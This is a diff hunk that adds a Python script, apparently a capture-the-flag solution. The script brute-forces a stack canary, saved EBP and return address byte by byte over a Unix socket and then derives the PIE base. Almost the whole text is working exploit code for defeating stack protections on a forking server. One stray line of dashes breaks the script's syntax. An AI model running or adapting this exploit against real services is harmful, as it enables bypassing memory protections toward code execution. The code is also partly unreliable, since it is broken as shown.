@@ -271,3 +271,145 @@ if __name__ == "__main__":
     run_bruteforce()
 
 ```
+
+
+```python
+  
+#!/usr/bin/env python3
+import socket, sys, time
+
+SOCK_PATH = "~/judge_sock"
+
+# --- layout ---------------------------------------------------------------
+OFFSET_TO_CANARY = 256
+DELIMITER        = b"\x0a"
+PTR              = 4
+
+BASE = b"A" * (OFFSET_TO_CANARY - 1) + DELIMITER
+
+---------------------
+LEAK_CANARY  = False                       # you have it -> don't re-leak
+KNOWN_CANARY = bytes.fromhex("00aabbcc")   # <-- your recovered canary (LE)
+
+KNOWN_GAP  = b"\x00" * 7                    # 7 confirmed nulls after canary
+GAP_REMAIN = 1                             # the 8th gap byte is still unknown
+
+# EBP: normally required to reach ret. Try True first — if the ret sweep
+# below finds survivors, the caller never used EBP and you just saved 4 bytes.
+SKIP_EBP = False
+JUNK_EBP = b"\x42" * PTR
+
+# Return address = code pointer. Under PIE the base is page-aligned, so
+# ret & 0xfff is fixed == static call-site offset (objdump the insn AFTER the
+# call into the vuln fn). Skips the LSB, cuts byte #1 to 16 candidates.
+RET_STATIC_OFF = 0x11a7                    # <-- your offset; None = brute all 4
+
+TIMEOUT  = 1.0
+requests = 0
+MARKER   = None
+
+def log(m): sys.stdout.write(m); sys.stdout.flush()
+
+def send_payload(payload, timeout=TIMEOUT):
+    global requests
+    requests += 1
+    try:
+        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+        s.settimeout(timeout)
+        s.connect(SOCK_PATH)
+        s.sendall(payload)
+        try: data = s.recv(4096)
+        except socket.timeout: data = None
+        s.close()
+        return data
+    except (ConnectionResetError, BrokenPipeError, socket.timeout, OSError):
+        return None
+
+def calibrate():
+    global MARKER
+    for probe in (b"hello\n", b"x\n", b"\n"):
+        data = send_payload(probe)
+        if data:
+            MARKER = data.split(b"\n")[0] or data[:8]
+            log(f"[+] alive-marker: {MARKER!r}\n"); return True
+    log("[-] no baseline reply\n"); return False
+
+def alive(payload, timeout=TIMEOUT):
+    data = send_payload(payload, timeout)
+    return data is not None and MARKER in data
+
+def leak_byte(prefix, candidates=range(256)):
+    # Non-survivors cost 1 request (short-circuit); winner is confirmed 3x.
+    for g in candidates:
+        c = prefix + bytes([g])
+        if alive(c) and alive(c) and alive(c, TIMEOUT * 2):
+            return g
+    return None
+
+def leak_run(base, positions, label):
+    """positions: one candidate-iterable per byte to leak."""
+    known = b""
+    for i, cands in enumerate(positions):
+        b = leak_byte(base + known, cands)
+        if b is None:
+            time.sleep(0.2); b = leak_byte(base + known, cands)
+        if b is None:
+            log(f"[-] {label} +{i}: nothing survived\n"); return None
+        known += bytes([b])
+        log(f"    [{label}] +{i}: 0x{b:02x}  ({known.hex()})\n")
+    return known
+
+def as_addr(b4): return int.from_bytes(b4, "little")
+
+if __name__ == "__main__":
+    if not calibrate(): sys.exit(1)
+
+    # 1) canary
+    if LEAK_CANARY:
+        rest = leak_run(BASE + b"\x00", [range(256)] * 3, "canary")  # LSB known null
+        if rest is None: sys.exit(1)
+        canary = b"\x00" + rest
+    else:
+        canary = KNOWN_CANARY
+    log(f"[+] canary = {canary.hex()}\n\n")
+
+    fixed = BASE + canary + KNOWN_GAP
+    log(f"[+] known gap (not leaked): {KNOWN_GAP.hex()}\n")
+
+    # 2) remaining gap byte(s)
+    gap = leak_run(fixed, [range(256)] * GAP_REMAIN, "gap")
+    if gap is None: sys.exit(1)
+    fixed += gap
+
+    # 3) saved EBP
+    if SKIP_EBP:
+        ebp = JUNK_EBP
+        log(f"[+] EBP skipped, junk = {ebp.hex()}\n")
+    else:
+        ebp = leak_run(fixed, [range(256)] * PTR, "ebp")
+        if ebp is None: sys.exit(1)
+    fixed += ebp
+
+    # 4) return address (constrained by PIE page offset if provided)
+    if RET_STATIC_OFF is not None:
+        b0       = RET_STATIC_OFF & 0xff                 # fully known
+        lo_nib   = (RET_STATIC_OFF >> 8) & 0x0f          # low nibble of byte1 known
+        b1_cands = [lo_nib | (hi << 4) for hi in range(16)]
+        ret_pos  = [[b0], b1_cands, range(256), range(256)]
+    else:
+        ret_pos  = [range(256)] * PTR
+    ret = leak_run(fixed, ret_pos, "ret")
+    if ret is None: sys.exit(1)
+
+    log("\n====================\n")
+    log(f"[+] canary         = {hex(as_addr(canary))}\n")
+    log(f"[+] gap(8th byte)  = {gap.hex()}\n")
+    log(f"[+] saved EBP      = {hex(as_addr(ebp))}{' (junk)' if SKIP_EBP else ''}\n")
+    log(f"[+] return address = {hex(as_addr(ret))}\n")
+    if RET_STATIC_OFF is not None:
+        log(f"[+] PIE base       = {hex(as_addr(ret) - RET_STATIC_OFF)}\n")
+    log(f"[+] requests used  = {requests}\n")
+    log("====================\n")
+
+
+```
